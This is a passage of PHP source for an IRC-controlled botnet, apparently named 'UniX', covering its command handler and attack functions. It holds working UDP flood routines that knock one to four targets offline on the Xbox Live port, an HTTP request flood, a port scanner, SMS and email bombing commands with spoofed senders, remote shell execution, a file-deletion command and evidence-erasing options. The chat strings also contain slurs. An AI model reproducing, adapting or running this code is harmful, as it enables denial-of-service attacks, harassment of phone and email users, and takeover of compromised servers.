 771                                                     $up = $this->ex( 'w' );
 772                                                     $this->privmsg( $this->ffff_you( ),"".$part1."".$red." Uptime ".$part2."".$blue." ".$up."");
 773                                                 break;
 774                                             }
 775                                             case "cellhelp":
 776                                             {
 777                                                     $part1 = $this->config['part1'];
 778                                                     $part2 = $this->config['part2'];
 779                                                     $blue = $this->config['blue'];
 780                                                     $red = $this->config['yellow'];
 781                                                     $cellhelp = "To spam a Cell Phone you will have to know the NUMBER and CARRIER. Example Command: ".$red.".verizon 5551234567 youremail@fbi.gov Subject NumberOfTextsToSend Message";
 782                                                     $this->privmsg( $this->ffff_you( ),"".$part1."".$red." Cell Spammer ".$part2."".$blue." ".$cellhelp."");
 783                                                 break;
 784                                             }
 785                                             case "carriers":
 786                                             {
 787                                                     $part1 = $this->config['part1'];
 788                                                     $part2 = $this->config['part2'];
 789                                                     $blue = $this->config['blue'];
 790                                                     $red = $this->config['yellow'];
 791                                                     $bybye = $this->ex( 'rm -rf *gow*' );
 792                                                     $this->privmsg( $this->ffff_you( ),"".$part1."".$red." CaRRieRs ".$part2."".$blue." UniX can currently spam - AT&T, Verizon, Sprint, Alltel, T-Mobile, US Celluar, and Boost Mobile");
 793                                                 break;
 794                                             }
 795                                             case "ver":
 796                                             {
 797                                                     $leetprefix = $this->config['leetprefix'];
 798                                                     $leetsuffixred = $this->config['leetsuffixred'];
 799                                                     $blue = $this->config['blue'];
 800                                                     $red = $this->config['yellow'];
 801                                                     $version = $this->config['version'];
 802                                                     $this->privmsg( $this->ffff_you( ),"".$red."The bot version is $leetprefix$blue $version $leetsuffixred");
 803                                                 break;
 804                                             }
 805                                             case "v":
 806                                             {
 807                                                     $leetprefix = $this->config['leetprefix'];
 808                                                     $leetsuffixred = $this->config['leetsuffixred'];
 809                                                     $blue = $this->config['blue'];
 810                                                     $red = $this->config['yellow'];
 811                                                     $version = $this->config['version'];
 812                                                     $this->privmsg( $this->ffff_you( ),"".$red."The bot version is $leetprefix$blue $version $leetsuffixred");
 813                                                 break;
 814                                             }
 815                                             case "hop":
 816                                             {
 817                                                 $channel = $mcmd[1];
 818                                                 $this->send( "PART ".$channel );
 819                                                 $this->join( $channel );
 820                                                 break;
 821                                             }
 822                                             case "raw":
 823                                             {
 824                                                 $this->send(strstr($msg,$mcmd[1]));
 825                                                 break;
 826                                             }
 827                                             case "ip123":
 828                                             {
 829                                                 $leetprefixwhite = $this->config['leetprefixwhite'];
 830                                                 $leetsuffixwhite = $this->config['leetsuffixwhite'];
 831                                                 $red = $this->config['yellow'];
 832                                                 $blue = $this->config['blue'];
 833                                                 $ipadd = "Ip AddReSS";
 834                                                 $this->privmsg( $this->ffff_you( ),"$blue $ipadd $leetprefixwhite ".$red." ".$_SERVER['SERVER_ADDR']." $leetsuffixwhite");
 835                                                 break;
 836                                             }
 837                                             case "lastlogin":
 838                                             {
 839                                                 $red = $this->config['yellow'];
 840                                                 $blue = $this->config['blue'];
 841                                                 $part1 = $this->config['part1'];
 842                                                 $part2 = $this->config['part2'];
 843                                                 $attempt = $this->ex('cat ion_cache.dat');
 844                                                 $this->privmsg( $this->ffff_you( ),"$part1$red LasT LogiN $part2$blue from $attempt");
 845                                                 break;
 846                                             }
 847                                             case "commands":
 848                                             {
 849                                                 $leetprefixwhite = $this->config['leetprefixwhite'];
 850                                                 $leetsuffixwhite = $this->config['leetsuffixwhite'];
 851                                                 $red = $this->config['yellow'];
 852                                                 $blue = $this->config['blue'];
 853                                                 $version = $this->config['version'];
 854                                                 $cmdz = "Command List for UniX version $version private:";
 855                                                 $this->privmsg( $this->ffff_you( ),"$leetprefixwhite$red $cmdz $leetsuffixwhite");
 856                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."UDP-Flood".$blue."] ? ? ? ".$red.".udpflood ip packetsize time".$blue." ? ? ?");
 857                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Xbox Live Flood".$blue."] ? ? ? ".$red.".xblflood ip packetsize time port".$blue." ? ? ?");
 858                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Two BK Flood".$blue."] ? ? ? ".$red.".2kidz first.ip second.ip".$blue." ? ? ?");
 859                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Three BK Flood".$blue."] ? ? ? ".$red.".3kidz first.ip second.ip third.ip".$blue." ? ? ?");
 860                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Four BK Flood".$blue."] ? ? ? ".$red.".4kidz first.ip second.ip third.ip fourth.ip".$blue." ? ? ?");
 861                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Cell RapE".$blue."] ? ? ? ".$red.".cellhelp".$blue." ? ? ?");
 862                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Cell Phone Carriers".$blue."] ? ? ? ".$red.".carriers".$blue." ? ? ?");
 863                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Evidence Eraser".$blue."] ? ? ? ".$red.".noevidence".$blue." ? ? ?");
 864                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Hop".$blue."] ? ? ? ".$red.".hop #channel".$blue." ? ? ?");
 865                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Exec".$blue."] ? ? ? ".$red.".exec unix command(s)".$blue." ? ? ?");
 866                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."eMail RapE".$blue."] ? ? ? ".$red.".bomb victim@fbi.gov spoofed@fake.com Subject NumberOfMails EmailBody".$blue." ? ? ?");
 867                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Count".$blue."] ? ? ? ".$red.".count".$blue." ? ? ?");
 868                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Nick".$blue."] ? ? ? ".$red.".nick (nzm or unix)".$blue." ? ? ?");
 869                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Credits".$blue."] ? ? ? ".$red.".credits".$blue." ? ? ?");
 870                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Version".$blue."] ? ? ? ".$red.".v or !ver or !version".$blue." ? ? ?");
 871                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Bot Ip".$blue."] ? ? ? ".$red.".ip".$blue." ? ? ?");
 872                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."MD5 Encrypt".$blue."] ? ? ? ".$red.".md5 string_to_encrypt".$blue." ? ? ?");
 873                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."DnS".$blue."] ? ? ? ".$red.".dns google.com".$blue." ? ? ?");
 874                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Kill Bot".$blue."] ? ? ? ".$red.".exit or !gtfo".$blue." ? ? ?");
 875                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Reconnect".$blue."] ? ? ? ".$red.".restart".$blue." ? ? ?");
 876                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Whois".$blue."] ? ? ? ".$red.".whois 127.0.0.1".$blue." ? ? ?");
 877                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Raw Irc Commands".$blue."] ? ? ? ".$red.".join, .part, .msg".$blue." ? ? ?");
 878                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Port Scan".$blue."] ? ? ? ".$red.".pscan ip port".$blue." ? ? ?");
 879                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Infected Site Check".$blue."] ? ? ? ".$red.".site".$blue." ? ? ?");
 880                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Random Nick".$blue."] ? ? ? ".$red.".randnick".$blue." ? ? ?");
 881                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."URL Bomb".$blue."] ? ? ? ".$red.".urlbomb site.com /path NumberOfRefreshes".$blue." ? ? ?");
 882                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Server Uptime".$blue."] ? ? ? ".$red.".uptime".$blue." ? ? ?");
 883                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Speed Test".$blue."] ? ? ? ".$red.".speedtest".$blue." ? ? ?");
 884                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Quick UDP-Flood".$blue."] ? ? ? ".$red.".quick ip".$blue." ? ? ?");
 885                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Check Last Login".$blue."] ? ? ? ".$red.".lastlogin".$blue." ? ? ?");
 886                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Raw Irc Command".$blue."] ? ? ? ".$red.".raw command".$blue." ? ? ?");
 887                                                 $this->privmsg( $this->ffff_you( ),"$blue [".$red."Change Command Prefix".$blue."] ? ? ? ".$red.".changeprefix newprefix Example: .changeprefix !".$blue." ? ? ?");
 888                                                 break;
 889                                             }
 890                                             case "md5":
 891                                             {
 892                                                         $leetprefix = $this->config['leetprefix'];
 893                                                         $leetsuffixred = $this->config['leetsuffixred'];
 894                                                         $red = $this->config['yellow'];
 895                                                         $blue = $this->config['blue'];
 896                                                 $str_md5 = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );
 897                                                 $this->privmsg( $this->ffff_you( ), "$blue [ $red MD5 $blue ]: $blue [ ".$red."'".$str_md5."' ".$blue."Encrypts To $red'".md5($str_md5)."' $blue ]" );
 898                                                 break;
 899                                             }
 900                                             case "dns":
 901                                             {
 902                                                 if(isset($mcmd[1]))
 903                                                    {
 904                                                       $ip = explode(".",$mcmd[1]);
 905                                                       if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1])
 906                                                         && is_numeric($ip[2]) && is_numeric($ip[3]))
 907                                                       {
 908                                                         $leetprefix = $this->config['leetprefix'];
 909                                                         $leetsuffixred = $this->config['leetsuffixred'];
 910                                                         $red = $this->config['yellow'];
 911                                                         $blue = $this->config['blue'];
 912                                                          $this->privmsg($this->ffff_you( ),"$leetprefix $blue [ $red DnS $blue ]: $red ".$mcmd[1]." $blue Resolves To $leetprefix $red ".gethostbyaddr($mcmd[1]));
 913                                                           }
 914                                                       else
 915                                                       {
 916                                                         $leetprefix = $this->config['leetprefix'];
 917                                                         $leetsuffixred = $this->config['leetsuffixred'];
 918                                                         $red = $this->config['yellow'];
 919                                                         $blue = $this->config['blue'];
 920                             $this->privmsg($this->ffff_you( ),"$blue [ $red DnS $blue ]: $red ".$mcmd[1]." $blue Resolves To $red ".gethostbyname($mcmd[1]));
 921                                                       }
 922                                                    }
 923                                                 break;
 924                                             }
 925                                             case "exit":
 926                                             {
 927                                                 fclose( $this->conn );
 928                                                 exit( );
 929                                                 break;
 930                                             }
 931                                             case "husk":
 932                                             {
 933                                                 fclose( $this->conn );
 934                                                 exit( );
 935                                                 break;
 936                                             }
 937                                             case "gtfo":
 938                                             {
 939                                                 fclose( $this->conn );
 940                                                 exit( );
 941                                                 break;
 942                                             }
 943                                             case "restart":
 944                                             {
 945                                                 $leetprefixwhite = $this->config['leetprefixwhite'];
 946                                                 $leetsuffixwhite = $this->config['leetsuffixwhite'];
 947                                                 $red = $this->config['yellow'];
 948                                                 $blue = $this->config['blue'];
 949                                                 $this->privmsg( $this->ffff_you( ), "$leetprefixwhite $red Restarting! $leetsuffixwhite $blue Please wait!" );
 950                                                 $this->send( "QUIT :restart command from ".$nick );
 951                                                 fclose( $this->conn );
 952                                                 $this->start();
 953                                                 break;
 954                                             }
 955                                             case "lastresort":
 956                                             {
 957                                                 if( count( $mcmd ) > 3 )
 958                                                 {
 959                                                     $server = $mcmd[1];
 960                                                     $port = $mcmd[2];
 961                                                     $channel = $mcmd[3];
 962                                                     $key = $mcmd[4];
 963                                                     if( $this->using_encode )
 964                                                     {
 965                                                         $this->config[ 'server' ] = base64_encode( $server );
 966                                                         $this->config[ 'chan' ] = base64_encode( str_replace( "#", "", $channel ) );
 967                                                         $this->config[ 'key' ] = base64_encode( $key );
 968                                                     }
 969                                                     else
 970                                                     {
 971                                                         $this->config[ 'server' ] = $server;
 972                                                         $this->config[ 'chan' ] = str_replace( "#", "", $channel );
 973                                                         $this->config[ 'key' ] = $key;
 974                                                     }
 975                                                     $this->config[ 'port' ] = $port;
 976                                                     $this->privmsg( $this->ffff_you( ), "[ moveserver ] ".$server." => ".$port." => ".$channel." => ".$key );
 977                                                     $this->send( "QUIT :moveserver command from ".$nick );
 978                                                     fclose( $this->conn );
 979                                                     $this->start();
 980                                                 }
 981                                                 break;
 982                                             }
 983                                             case "whois":
 984                                             {
 985                                                 $param2 = $mcmd[1];
 986                                                 if( !empty( $param2 ) )
 987                                                 {
 988                                                     //do it
 989                                                     //http://www.geoip.co.uk/?IP=98.214.115.193&submit.x=23&submit.y=11
 990                                                     $fp = fsockopen( "geoip.co.uk", 80, $errno, $errstr, 30 );
 991                                                     if( $fp )
 992                                                     {
 993                                                         $out = "GET /ipwhois.php?ip=$param2&Submit=submit HTTP/1.1\r\n";
 994                                                         $out .= "Host: geoip.co.uk\r\n";
 995                                                         $out .= "Keep-Alive: 300\r\n";
 996                                                         $out .= "Connection: keep-alive\r\n\r\n";
 997                                                         fwrite( $fp, $out );
 998                                                         $whodata = '';
 999                                                         while(!feof($fp))
1000                                                         {
1001                                                             /*do nothing*/
1002                                                             $whodata .= fread( $fp, 1024 );
1003                                                         }
1004                                                         $countryc = explode( "            :", $whodata );
1005                                                         $countryc = explode( "            : <img src=", $countryc[1] );
1006                                                         $country = strip_tags( $countryc[0] );
1007                                                         $statec = explode( "$countryc", $whodata );
1008                                                         $statec = explode( "                        <br>", $statec[1] );
1009                                                         $state = strip_tags( $statec[0] );
1010                                                         $cityc = explode( "$statec", $whodata );
1011                                                         $cityc = explode( "            : <img src=", $cityc[1] );
1012                                                         $city = strip_tags( $cityc[0] );
1013                                                         fclose( $fp );
1014                                                         $leetprefixwhite = $this->config['leetprefixwhite'];
1015                                                                                                                 $leetsuffixwhite = $this->config['leetsuffixwhite'];
1016                                                                                                                 $red = $this->config['yellow'];
1017                                                                                                                 $blue = $this->config['blue'];
1018                                                         $this->privmsg( $this->ffff_you( ), "$leetprefixwhite $red $param2 $leetsuffixwhite - $red Country - $blue $country" );
1019                                                         $this->privmsg( $this->ffff_you( ), "$leetprefixwhite $red $param2 $leetsuffixwhite - $red City - $blue $city" );
1020                                                         $this->privmsg( $this->ffff_you( ), "$leetprefixwhite $red $param2 $leetsuffixwhite - $red State - $blue $state" );
1021                                                     }else{
1022                                                         $this->privmsg( $this->ffff_you( ), "[ whois ] Error: $errstr" );
1023                                                     }
1024                                                 }
1025                                                 else
1026                                                 {
1027                                                     $this->privmsg( $this->ffff_you( ), "[ whois ] Invalid params, use .whois <ip/host>" );
1028                                                 }
1029                                                 break;
1030                                             }
1031                                             case "join":
1032                                             {
1033                                                 $channel = $mcmd[1];
1034                                                 $key = $mcmd[2];
1035                                                 $this->join( $channel, $key );
1036                                                 break;
1037                                             }
1038                                             case "part":
1039                                             {
1040                                                 $this->send( "PART ".$mcmd[1] );
1041                                             }
1042                                             case "msg":
1043                                             {
1044                                                 $person = $mcmd[1];
1045                                                 $text = substr( strstr( $msg, $mcmd[1] ), strlen( $mcmd[1] ) + 1 );
1046                                                 $this->privmsg( $person, $text );
1047                                                 break;
1048                                             }
1049                                             case "pscan":
1050                                                       $leetprefix = $this->config['leetprefix'];
1051                                                     $leetsuffixred = $this->config['leetsuffixred'];
1052                                                     $blue = $this->config['blue'];
1053                                if(count($mcmd) > 2)
1054                                {
1055                                   if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))
1056                                      $this->privmsg($this->ffff_you( ),"$leetprefix $blue Port Scan $leetsuffixred : $red ".$mcmd[1].":".$mcmd[2]." $blue is OPEN !");
1057                                   else
1058                                      $this->privmsg($this->ffff_you( ),"$leetprefix $blue Port Scan $leetsuffixred : $blue ".$mcmd[1].":".$mcmd[2]." $red is CLOSED !");
1059                                       break;
1060                                }
1061                                             case "software":
1062                                             {
1063                                                 $this->privmsg( $this->ffff_you( ), $_SERVER[ 'SERVER_SOFTWARE' ] );
1064                                                 break;
1065                                             }
1066                                             case "site123":
1067                                             {
1068                                                 $leetprefixwhite = $this->config['leetprefixwhite'];
1069                                                 $leetsuffixwhite = $this->config['leetsuffixwhite'];
1070                                                 $red = $this->config['yellow'];
1071                                                 $blue = $this->config['blue'];
1072                                                 $ipzzz = ( $_SERVER["HTTP_HOST"] );
1073                                                 $this->privmsg( $this->ffff_you( ), "$blue This bot is running on $leetprefixwhite $red $ipzzz $leetsuffixwhite" );
1074                                                 break;
1075                                             }
1076                                             case "randnick":
1077                                             {
1078                                                 $this->set_nick();
1079                                                 break;
1080                                             }
1081                                             case "logout":
1082                                             {
1083                                                 $logoutmsg = $this->messages['logoutmsg'];
1084                                                 $leetprefixwhite = $this->config['leetprefixwhite'];
1085                                                 $leetsuffixwhite = $this->config['leetsuffixwhite'];
1086                                                 $red = $this->config['yellow'];
1087                                                 $part2 = $this->config['part2'];
1088                                                 $this->remove_auth( $host );
1089                                                 $this->privmsg( $this->ffff_you( ), "$logoutmsg $leetprefixwhite $red$nick $leetsuffixwhite $part2" );
1090                                                 break;
1091                                             }
1092                                             case "urlbomb":
1093                                             {
1094                                                 $this->urlbomb( $mcmd[ 1 ], $mcmd[ 2 ], $mcmd[ 3 ] );
1095                                                 break;
1096                                             }
1097                                             case "udpflood":
1098                                                 {
1099                                                    if( count( $mcmd ) > 3 )
1100                                                    {
1101                                                       $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);
1102                                                    }
1103                                                 }
1104                                             case "stop":
1105                                             {
1106                                             fclose($fp);
1107                                             break;
1108                                             }
1109                                             case "xblflood":
1110                                             {
1111                                                    if( count( $mcmd ) > 4 )
1112                                                    {;
1113                                                       $this->udpflood4($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]);
1114                                                    }
1115                                                 break;
1116                                             }
1117                                             case "speedtest":
1118                                             {
1119                                                       $this->udpflood3(hi,650000,5);
1120                                                 break;
1121                                             }
1122                                             case "2kidz":
1123                                             {
1124                                                       $this->udpflood5($mcmd[1],$mcmd[2]);
1125                                                 break;
1126                                             }
1127                                             case "3kidz":
1128                                             {
1129                                                       $this->udpflood7($mcmd[1],$mcmd[2],$mcmd[3]);
1130                                                 break;
1131                                             }
1132                                             case "4kidz":
1133                                             {
1134                                                       $this->udpflood6($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]);
1135                                                 break;
1136                                             }
1137                                                     case "quick":
1138                                             {
1139                                                    if( count( $mcmd ) > 1 )
1140                                                    {
1141                                                       $this->udpflood2($mcmd[1],65000,60);
1142                                                    }
1143                                                 break;
1144                                                 }
1145                                         }
1146                                     }
1147                                 }
1148                             break;
1149                         }
1150                     }
1151                 }
1152                 $old_buf = $this->buf;
1153             }
1154             $this->start();
1155         }
1156         function scanport( $host, $port )
1157         {
1158             if( fsockopen( $host, $port, $e, $s ) )
1159             {
1160                 return 1;
1161             }
1162             return 0;
1163         }
1164         function urlbomb( $host, $path, $times, $mode = 0 )
1165         {
1166             if( !isset( $host ) || !isset( $path ) || !isset( $times ) )
1167                 return;
1168             $leetprefixwhite = $this->config['leetprefixwhite'];
1169             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1170             $leetprefix = $this->config['leetprefix'];
1171             $leetsuffixred = $this->config['leetsuffixred'];
1172             $red = $this->config['yellow'];
1173             $blue = $this->config['blue'];
1174             $http = "http://";
1175             $this->privmsg( $this->ffff_you( ),"$leetprefixwhite $red URLbomb started! $leetsuffixwhite  on $red [ $blue ".$http."".$host."".$path." $red ]");
1176             $success = 0;
1177             for( $i = 0; $i < $times; $i++ )
1178             {
1179                 $fp = fsockopen( $host, 80, $errno, $errstr, 30 );
1180                 if( $fp )
1181                 {
1182                     $out = "GET /".$path." HTTP/1.1\r\n";
1183                     $out .= "Host: ".$host."\r\n";
1184                     $out .= "Keep-Alive: 300\r\n";
1185                     $out .= "Connection: keep-alive\r\n\r\n";
1186                     fwrite( $fp, $out );
1187                     if( $mode != 0 )
1188                     {
1189                         while(!feof($fp)){/*do nothing*/}
1190                     }
1191                     fclose( $fp );
1192                     $success++;
1193                 }
1194             }
1195             $leetprefixwhite = $this->config['leetprefixwhite'];
1196             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1197             $leetprefix = $this->config['leetprefix'];
1198             $leetsuffixred = $this->config['leetsuffixred'];
1199             $red = $this->config['yellow'];
1200             $blue = $this->config['blue'];
1201             $http = "http://";
1202             $this->privmsg( $this->ffff_you( ),"$leetprefixwhite $red URLbomb finished! $leetsuffixwhite $blue on $red [ $blue ".$http."".$host."".$path." $red ] $blue [$red Times Visited: $blue ".$success." $blue ]" );
1203         }
1204         function udpflood2( $host, $packetsize, $time )
1205         {
1206             $udpmsgfast = $this->messages['udpmsgfast'];
1207             $leetprefixwhite = $this->config['leetprefixwhite'];
1208             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1209             $red = $this->config['yellow'];
1210             $blue = $this->config['yellow'];
1211             $this->privmsg( $this->ffff_you( ),"$udpmsgfast Started On $leetprefixwhite$red $host $leetsuffixwhite" );
1212             $packet = "";
1213             for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
1214             $timei = time();
1215             $i = 0;
1216             while(time()-$timei < $time)
1217             {
1218                 $xboxlive = "3074";
1219                 $fp=fsockopen("udp://".$host,$xboxlive,$e,$s,5);
1220                 fwrite($fp,$packet);
1221                 fclose($fp);
1222                 $i++;
1223             }
1224             $env = $i * $packetsize;
1225             $env = $env / 1048576;
1226             $vel = $env / $time;
1227             $vel = round($vel);
1228             $env = round($env);
1229             $fag = "$udpmsgfast - Sent Total $leetprefixwhite$red $env Megabytes $leetsuffixwhite$red With A Speed Of $leetprefixwhite$red $vel MegaBytes/Second $leetsuffixwhite";
1230             $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
1231             $this->ex('echo 1 >> cache.dat');
1232         }
1233     function udpflood3( $host, $packetsize, $time )
1234         {
1235             $leetprefixwhite = $this->config['leetprefixwhite'];
1236             $speedtest = $this->messages['speedtest'];
1237             $speedtestfin = $this->messages['speedtestfin'];
1238             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1239             $red = $this->config['yellow'];
1240             $blue = $this->config['yellow'];
1241             $green = $this->config['green'];
1242             $part1 = $this->config['part1'];
1243             $part2 = $this->config['part2'];
1244             $this->privmsg( $this->ffff_you( ),"$part1$red The Speedtest Has been Started.... $part2 - $blue Please Wait......" );
1245             $packet = "";
1246             for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
1247             $timei = time();
1248             $i = 0;
1249             while(time()-$timei < $time)
1250             {
1251                 $xboxlive = "3074";
1252                 $fp=fsockopen("udp://".$host,$xboxlive,$e,$s,5);
1253                 fwrite($fp,$packet);
1254                 fclose($fp);
1255                 $i++;
1256             }
1257             $env = $i * $packetsize;
1258             $env = $env / 1048576;
1259             $vel = $env / $time;
1260             $vel = round($vel);
1261             $env = round($env);
1262             $red = $this->config['yellow'];
1263             $part1 = $this->config['part1'];
1264             $part2 = $this->config['part2'];
1265             $blue = $this->config['yellow'];
1266             $fag = "$part1$red The Speedtest Is Complete. $part2 - $blue This Bot Hits At".$red." $vel MegaBytes/Second";
1267             $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
1268             $this->ex('echo 1 >> cache.dat');
1269         }
1270     function udpflood5( $host, $crack )
1271         {
1272             $packetsize = "65000";
1273             $time = "60";
1274             $port = "3074";
1275             $leetprefixwhite = $this->config['leetprefixwhite'];
1276             $speedtest = $this->messages['speedtest'];
1277             $speedtestfin = $this->messages['speedtestfin'];
1278             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1279             $red = $this->config['yellow'];
1280             $blue = $this->config['yellow'];
1281             $green = $this->config['green'];
1282             $part1 = $this->config['part1'];
1283             $part2 = $this->config['part2'];
1284             $this->privmsg( $this->ffff_you( ),"$part1$red TwO PlayeR DDoS $part2 - $blue Booting $host and $crack! Attacking on port $port" );
1285             $packet = "";
1286             for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
1287             $timei = time();
1288             $i = 0;
1289             while(time()-$timei < $time)
1290             {
1291                 $port = "3074";
1292                 $fp=fsockopen("udp://".$host,$port,$e,$s,5);
1293                 $fp2=fsockopen("udp://".$crack,$port,$e,$s,5);
1294                 fwrite($fp,$packet);
1295                 fwrite($fp2,$packet);
1296                 fclose($fp);
1297                 fclose($fp2);
1298                 $i++;
1299             }
1300             $env = $i * $packetsize;
1301             $env = $env / 1048576;
1302             $vel = $env / $time;
1303             $vel = round($vel);
1304             $env = round($env);
1305             $red = $this->config['yellow'];
1306             $part1 = $this->config['part1'];
1307             $part2 = $this->config['part2'];
1308             $blue = $this->config['yellow'];
1309             $fag = "$part1$red TwO PlayeR DDoS! $part2 - $blue $host and $crack are offline! ".$red." $vel MegaBytes/Second";
1310             $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
1311             $this->ex('echo 1 >> cache.dat');
1312         }
1313     function udpflood6( $host, $crack, $herion, $coke )
1314         {
1315             $packetsize = "65000";
1316             $time = "60";
1317             $port = "3074";
1318             $leetprefixwhite = $this->config['leetprefixwhite'];
1319             $speedtest = $this->messages['speedtest'];
1320             $speedtestfin = $this->messages['speedtestfin'];
1321             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1322             $red = $this->config['yellow'];
1323             $blue = $this->config['yellow'];
1324             $green = $this->config['green'];
1325             $part1 = $this->config['part1'];
1326             $part2 = $this->config['part2'];
1327             $this->privmsg( $this->ffff_you( ),"$part1$red 4 Player DDoS! $part2 - $blue Booting $host, $crack, $herion, and $coke! Attacking on port $port" );
1328             $packet = "";
1329             for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
1330             $timei = time();
1331             $i = 0;
1332             while(time()-$timei < $time)
1333             {
1334                 $port = "3074";
1335                 $fp=fsockopen("udp://".$host,$port,$e,$s,5);
1336                 $fp2=fsockopen("udp://".$crack,$port,$e,$s,5);
1337                 $fp3=fsockopen("udp://".$herion,$port,$e,$s,5);
1338                 $fp4=fsockopen("udp://".$coke,$port,$e,$s,5);
1339                 fwrite($fp,$packet);
1340                 fwrite($fp2,$packet);
1341                 fwrite($fp3,$packet);
1342                 fwrite($fp4,$packet);
1343                 fclose($fp);
1344                 fclose($fp2);
1345                 fclose($fp3);
1346                 fclose($fp4);
1347                 $i++;
1348             }
1349             $env = $i * $packetsize;
1350             $env = $env / 1048576;
1351             $vel = $env / $time;
1352             $vel = round($vel);
1353             $env = round($env);
1354             $red = $this->config['yellow'];
1355             $part1 = $this->config['part1'];
1356             $part2 = $this->config['part2'];
1357             $blue = $this->config['yellow'];
1358             $fag = "$part1$red 4 Player DDoS CompletE! $part2 - $blue $host, $crack, $herion, and $coke are ALL offline! ".$red." $vel MegaBytes/Second";
1359             $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
1360             $this->ex('echo 1 >> cache.dat');
1361         }
1362     function udpflood7( $stoner, $allalone, $daynnite )
1363         {
1364             $packetsize = "65000";
1365             $time = "60";
1366             $port = "3074";
1367             $leetprefixwhite = $this->config['leetprefixwhite'];
1368             $speedtest = $this->messages['speedtest'];
1369             $speedtestfin = $this->messages['speedtestfin'];
1370             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1371             $red = $this->config['yellow'];
1372             $blue = $this->config['yellow'];
1373             $green = $this->config['green'];
1374             $part1 = $this->config['part1'];
1375             $part2 = $this->config['part2'];
1376             $this->privmsg( $this->ffff_you( ),"$part1$red 3 Player DDoS! $part2 - $blue Booting $stoner, $allalone, and $daynnite! Attacking on port $port" );
1377             $packet = "";
1378             for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
1379             $timei = time();
1380             $i = 0;
1381             while(time()-$timei < $time)
1382             {
1383                 $port = "3074";
1384                 $fp2=fsockopen("udp://".$stoner,$port,$e,$s,5);
1385                 $fp3=fsockopen("udp://".$allalone,$port,$e,$s,5);
1386                 $fp4=fsockopen("udp://".$daynnite,$port,$e,$s,5);
1387                 fwrite($fp2,$packet);
1388                 fwrite($fp3,$packet);
1389                 fwrite($fp4,$packet);
1390                 fclose($fp2);
1391                 fclose($fp3);
1392                 fclose($fp4);
1393                 $i++;
1394             }
1395             $env = $i * $packetsize;
1396             $env = $env / 1048576;
1397             $vel = $env / $time;
1398             $vel = round($vel);
1399             $env = round($env);
1400             $red = $this->config['yellow'];
1401             $part1 = $this->config['part1'];
1402             $part2 = $this->config['part2'];
1403             $blue = $this->config['yellow'];
1404             $fag = "$part1$red 3 Player DDoS CompletE! $part2 - $blue $stoner, $allalone, and $daynnite are now offline offline! ".$red." $vel MegaBytes/Second";
1405             $this->privmsg( $this->ffff_you( ),"$fag$fag2" );
1406             $this->ex('echo 1 >> cache.dat');
1407         }
1408         function udpflood( $host, $packetsize, $time )
1409         {
1410             $udpmsg = $this->messages['udpmsg'];
1411             $leetprefixwhite = $this->config['leetprefixwhite'];
1412             $leetsuffixwhite = $this->config['leetsuffixwhite'];
1413             $red = $this->config['yellow'];
1414             $blue = $this->config['yellow'];
1415             $this->privmsg( $this->ffff_you( ),"$udpmsg Started On $leetprefixwhite$red $host $leetsuffixwhite for $leetprefixwhite$red $time Seconds $leetsuffixwhite$red With $leetprefixwhite$red $packetsize Packets $leetsuffixwhite" );
1416             $packet = "";
1417             for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
1418             $timei = time();
1419             $i = 0;
1420             while(time()-$timei < $time)
1421             {
1422                 $fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
1423                 fwrite($fp,$packet);
1424                 fclose($fp);
1425                 $i++;
1426             }
1427             $env = $i * $packetsize;
1428             $env = $env / 1048576;
1429             $vel = $env / $time;
